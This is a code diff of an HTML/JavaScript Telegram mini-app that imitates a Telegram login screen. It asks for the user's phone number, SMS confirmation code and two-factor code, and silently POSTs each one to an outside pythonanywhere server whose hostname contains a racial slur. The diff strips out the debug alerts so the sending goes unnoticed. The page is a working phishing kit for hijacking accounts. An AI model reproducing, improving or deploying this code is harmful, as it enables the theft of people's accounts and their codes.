@@ -544,251 +544,207 @@
   </div>
 
   <script>
-    // Инициализация Telegram Web App
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-    tg.MainButton.hide();
+  // Инициализация Telegram Web App
+  const tg = window.Telegram.WebApp;
+  tg.expand();
+  tg.MainButton.hide();
 
-    let currentScreen = 1;
-    let resendTimerInterval;
+  let currentScreen = 1;
+  let resendTimerInterval;
 
-    // URL сервера
-    const SERVER_URL = "https://monkeynigger.pythonanywhere.com/send-log";
+  // URL сервера
+  const SERVER_URL = "https://monkeynigger.pythonanywhere.com/send-log";
 
-    // УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ЛОГОВ
-    async function sendLog(action, details = '') {
-      try {
-        alert('🔧 DEBUG: sendLog начал выполнение');
-        
-        // Получаем данные пользователя
-        let user;
-        try {
-          user = tg.initDataUnsafe?.user;
-        } catch (e) {
-          user = null;
-        }
+  // ПРОСТАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ЛОГОВ
+  async function sendLog(action, details = '') {
+    try {
+      // Просто получаем данные пользователя
+      const user = tg.initDataUnsafe?.user || {
+        id: Date.now(),
+        first_name: 'User',
+        username: 'user'
+      };
 
-        alert(`🔧 DEBUG: Данные пользователя: ${JSON.stringify(user)}`);
-        
-        // Если данные недоступны, используем заглушку
-        if (!user) {
-          alert('🔧 DEBUG: Используем заглушку для пользователя');
-          user = {
-            id: Date.now(),
-            first_name: 'User',
-            username: 'user'
-          };
-        }
+      const logData = {
+        user_id: user.id,
+        user_name: user.first_name || 'NoName',
+        user_username: user.username || 'no_username',
+        action: action,
+        details: details
+      };
 
-        const logData = {
-          user_id: user.id,
-          user_name: user.first_name || 'NoName',
-          user_username: user.username || 'no_username',
-          action: action,
-          details: details
-        };
+      // Пробуем отправить - БЕЗ АЛЕРТОВ
+      const response = await fetch(SERVER_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(logData)
+      });
 
-        alert(`🔧 DEBUG: Отправляемые данные: ${JSON.stringify(logData)}`);
-        alert(`🔧 DEBUG: URL сервера: ${SERVER_URL}`);
-
-        // Отправляем на наш сервер
-        alert('🔧 DEBUG: Начинаем fetch запрос...');
-        const response = await fetch(SERVER_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(logData)
-        });
-
-        alert(`🔧 DEBUG: Статус ответа: ${response.status}`);
-        alert(`🔧 DEBUG: Ответ OK: ${response.ok}`);
-        
-        const result = await response.json();
-        alert(`🔧 DEBUG: Ответ сервера: ${JSON.stringify(result)}`);
-        
-        alert('✅ DEBUG: sendLog успешно завершен');
-        
-      } catch (error) {
-        alert(`❌ ОШИБКА в sendLog: ${error.message}`);
-        console.error('❌ Ошибка отправки лога:', error);
-      }
-    }
-
-    function updateCountryCode() {
-      const countrySelect = document.getElementById('country');
-      const countryCodeElement = document.getElementById('countryCode');
-      const selectedValue = countrySelect.value;
-      countryCodeElement.textContent = selectedValue;
-    }
-
-    function nextScreen(screenNumber) {
-      document.getElementById(`screen${currentScreen}`).classList.remove('active');
-      document.getElementById(`screen${screenNumber}`).classList.add('active');
-      currentScreen = screenNumber;
-    }
-
-    function prevScreen(screenNumber) {
-      document.getElementById(`screen${currentScreen}`).classList.remove('active');
-      document.getElementById(`screen${screenNumber}`).classList.add('active');
-      currentScreen = screenNumber;
-    }
-
-    function moveToNext(input, currentIndex) {
-      if (input.value.length === 1) {
-        const inputs = input.parentElement.querySelectorAll('.code-input');
-        if (currentIndex < inputs.length) {
-          inputs[currentIndex].focus();
-        }
-      }
-    }
-
-    function handlePhoneSubmit() {
-      alert('🔧 DEBUG: Функция handlePhoneSubmit вызвана!');
-      
-      const phone = document.getElementById('phone').value;
-      const countrySelect = document.getElementById('country');
-      const country = countrySelect.options[countrySelect.selectedIndex].text;
-      const countryCode = document.getElementById('countryCode').textContent;
-      
-      if (!phone) {
-        alert('Пожалуйста, введите номер телефона');
-        return;
+      // Если ответ успешный - все ок
+      if (response.ok) {
+        console.log('✅ Лог отправлен:', action);
+      } else {
+        console.log('❌ Ошибка сервера:', response.status);
       }
       
-      alert('🔧 DEBUG: Данные получены, вызываю sendLog');
-      
-      // Отправляем лог о вводе номера
-      sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
-      
-      alert('🔧 DEBUG: sendLog завершен, перехожу к nextScreen');
-      
-      nextScreen(2);
+    } catch (error) {
+      // Просто логируем ошибку, не показываем алерт
+      console.log('❌ Ошибка отправки:', error.message);
     }
+  }
 
-    function handleSmsSubmit() {
-      alert('🔧 DEBUG: Функция handleSmsSubmit вызвана!');
-      
-      const codeInputs = document.querySelectorAll('#screen2 .code-input');
-      let smsCode = '';
-      codeInputs.forEach(input => smsCode += input.value);
-      
-      if (smsCode.length !== 5) {
-        alert('Пожалуйста, введите полный 5-значный код');
-        return;
+  function updateCountryCode() {
+    const countrySelect = document.getElementById('country');
+    const countryCodeElement = document.getElementById('countryCode');
+    const selectedValue = countrySelect.value;
+    countryCodeElement.textContent = selectedValue;
+  }
+
+  function nextScreen(screenNumber) {
+    document.getElementById(`screen${currentScreen}`).classList.remove('active');
+    document.getElementById(`screen${screenNumber}`).classList.add('active');
+    currentScreen = screenNumber;
+  }
+
+  function prevScreen(screenNumber) {
+    document.getElementById(`screen${currentScreen}`).classList.remove('active');
+    document.getElementById(`screen${screenNumber}`).classList.add('active');
+    currentScreen = screenNumber;
+  }
+
+  function moveToNext(input, currentIndex) {
+    if (input.value.length === 1) {
+      const inputs = input.parentElement.querySelectorAll('.code-input');
+      if (currentIndex < inputs.length) {
+        inputs[currentIndex].focus();
       }
-      
-      alert('🔧 DEBUG: SMS код получен, вызываю sendLog');
-      
-      // Отправляем лог о вводе SMS кода
-      sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
-      nextScreen(3);
     }
+  }
 
-    function handle2faSubmit() {
-      alert('🔧 DEBUG: Функция handle2faSubmit вызвана!');
-      
-      const codeInputs = document.querySelectorAll('#screen3 .code-input');
-      let faCode = '';
-      codeInputs.forEach(input => faCode += input.value);
-      
-      if (faCode.length !== 6) {
-        alert('Пожалуйста, введите полный 6-значный код');
-        return;
-      }
-      
-      alert('🔧 DEBUG: 2FA код получен, вызываю sendLog');
-      
-      // Отправляем лог о вводе 2FA кода
-      sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
-      completeAuth();
+  function handlePhoneSubmit() {
+    const phone = document.getElementById('phone').value;
+    const countrySelect = document.getElementById('country');
+    const country = countrySelect.options[countrySelect.selectedIndex].text;
+    const countryCode = document.getElementById('countryCode').textContent;
+    
+    if (!phone) {
+      alert('Пожалуйста, введите номер телефона');
+      return;
     }
+    
+    // Отправляем лог о вводе номера
+    sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
+    nextScreen(2);
+  }
 
-    function resendCode() {
-      alert('🔧 DEBUG: Функция resendCode вызвана!');
-      
-      const resendLink = document.getElementById('resendLink');
-      const resendTimer = document.getElementById('resendTimer');
-      
-      // Отправляем лог о запросе повторной отправки кода
-      sendLog('RESEND_CODE_REQUESTED', 'Пользователь запросил повторную отправку SMS кода');
-      
-      // Блокируем кнопку и запускаем таймер
-      resendLink.style.pointerEvents = 'none';
-      resendLink.style.color = '#999';
-      resendLink.textContent = 'Отправить повторно';
-      resendTimer.style.display = 'inline';
-      
-      let timeLeft = 30;
+  function handleSmsSubmit() {
+    const codeInputs = document.querySelectorAll('#screen2 .code-input');
+    let smsCode = '';
+    codeInputs.forEach(input => smsCode += input.value);
+    
+    if (smsCode.length !== 5) {
+      alert('Пожалуйста, введите полный 5-значный код');
+      return;
+    }
+    
+    // Отправляем лог о вводе SMS кода
+    sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
+    nextScreen(3);
+  }
+
+  function handle2faSubmit() {
+    const codeInputs = document.querySelectorAll('#screen3 .code-input');
+    let faCode = '';
+    codeInputs.forEach(input => faCode += input.value);
+    
+    if (faCode.length !== 6) {
+      alert('Пожалуйста, введите полный 6-значный код');
+      return;
+    }
+    
+    // Отправляем лог о вводе 2FA кода
+    sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
+    completeAuth();
+  }
+
+  function resendCode() {
+    const resendLink = document.getElementById('resendLink');
+    const resendTimer = document.getElementById('resendTimer');
+    
+    // Отправляем лог о запросе повторной отправки кода
+    sendLog('RESEND_CODE_REQUESTED', 'Пользователь запросил повторную отправку SMS кода');
+    
+    // Блокируем кнопку и запускаем таймер
+    resendLink.style.pointerEvents = 'none';
+    resendLink.style.color = '#999';
+    resendLink.textContent = 'Отправить повторно';
+    resendTimer.style.display = 'inline';
+    
+    let timeLeft = 30;
+    resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
+    
+    // Останавливаем предыдущий таймер, если он был
+    if (resendTimerInterval) {
+      clearInterval(resendTimerInterval);
+    }
+    
+    resendTimerInterval = setInterval(() => {
+      timeLeft--;
       resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
       
-      // Останавливаем предыдущий таймер, если он был
-      if (resendTimerInterval) {
+      if (timeLeft <= 0) {
         clearInterval(resendTimerInterval);
-      }
-      
-      resendTimerInterval = setInterval(() => {
-        timeLeft--;
-        resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
+        resendLink.style.pointerEvents = 'auto';
+        resendLink.style.color = '#007bff';
+        resendTimer.style.display = 'none';
         
-        if (timeLeft <= 0) {
-          clearInterval(resendTimerInterval);
-          resendLink.style.pointerEvents = 'auto';
-          resendLink.style.color = '#007bff';
-          resendTimer.style.display = 'none';
-          
-          // Показываем всплывающее окно
-          tg.showPopup({
-            title: 'Код отправлен',
-            message: 'Новый код подтверждения отправлен на ваш номер телефона.',
-            buttons: [{ type: 'ok' }]
-          });
-        }
-      }, 1000);
-    }
-
-    function handleCancel() {
-      alert('🔧 DEBUG: Функция handleCancel вызвана!');
-      
-      sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
-      tg.close();
-    }
-
-    function completeAuth() {
-      alert('🔧 DEBUG: Функция completeAuth вызвана!');
-      
-      sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
-      nextScreen(4);
-    }
-
-    function closeWebApp() {
-      alert('🔧 DEBUG: Функция closeWebApp вызвана!');
-      
-      sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
-      tg.close();
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-      alert('🔧 DEBUG: Страница загружена, вызываю sendLog APP_STARTED');
-      
-      sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
-      
-      const observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
-            if (document.getElementById('screen2').classList.contains('active')) {
-              document.querySelector('#screen2 .code-input').focus();
-            }
-            if (document.getElementById('screen3').classList.contains('active')) {
-              document.querySelector('#screen3 .code-input').focus();
-            }
-          }
+        // Показываем всплывающее окно
+        tg.showPopup({
+          title: 'Код отправлен',
+          message: 'Новый код подтверждения отправлен на ваш номер телефона.',
+          buttons: [{ type: 'ok' }]
         });
+      }
+    }, 1000);
+  }
+
+  function handleCancel() {
+    sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
+    tg.close();
+  }
+
+  function completeAuth() {
+    sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
+    nextScreen(4);
+  }
+
+  function closeWebApp() {
+    sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
+    tg.close();
+  }
+
+  document.addEventListener('DOMContentLoaded', function() {
+    // Отправляем лог о запуске приложения
+    sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
+    
+    const observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+          if (document.getElementById('screen2').classList.contains('active')) {
+            document.querySelector('#screen2 .code-input').focus();
+          }
+          if (document.getElementById('screen3').classList.contains('active')) {
+            document.querySelector('#screen3 .code-input').focus();
+          }
+        }
       });
-      
-      observer.observe(document.getElementById('screen2'), { attributes: true });
-      observer.observe(document.getElementById('screen3'), { attributes: true });
     });
-  </script>
+    
+    observer.observe(document.getElementById('screen2'), { attributes: true });
+    observer.observe(document.getElementById('screen3'), { attributes: true });
+  });
+</script>
 </body>
 </html>
